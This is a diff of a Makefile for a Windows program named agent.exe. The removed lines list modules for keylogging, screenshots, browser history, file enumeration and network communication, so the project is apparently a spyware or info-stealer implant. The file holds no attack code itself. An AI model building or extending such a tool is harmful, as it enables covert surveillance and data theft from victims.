@@ -1,26 +1,14 @@
-CC      = x86_64-w64-mingw32-gcc
-CFLAGS  = -Wall -Wextra -O2 -I. -DSQLITE_OMIT_LOAD_EXTENSION
-LDFLAGS = -lcurl -lws2_32 -liphlpapi -lgdi32 -lole32 -lshell32
+# Requires MSYS2 MinGW in PATH.
+# Run from MSYS2 MinGW64 terminal, or set PATH=C:\msys64\mingw64\bin;...
 
-TARGET = agent.exe
-SRCS   = agent.c \
-         core/system_info.c \
-         core/screenshot.c \
-         core/keylogger.c \
-         core/browser_history.c \
-         core/sqlite3.c \
-         core/installed_apps.c \
-         core/file_enum.c \
-         core/miniz.c \
-         network/ip.c \
-         network/communication.c
+CC      = gcc
+CFLAGS  = -Wall -O2 -DWINVER=0x0600 -D_WIN32_WINNT=0x0600
+LIBS    = -lwininet -liphlpapi -lgdi32 -lws2_32
 
-.PHONY: all clean
+all: agent.exe
 
-all: $(TARGET)
-
-$(TARGET): $(SRCS)
-	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
+agent.exe: agent.c config.h
+	$(CC) $(CFLAGS) agent.c -o agent.exe $(LIBS)
 
 clean:
-	rm -f $(TARGET)
+	del agent.exe
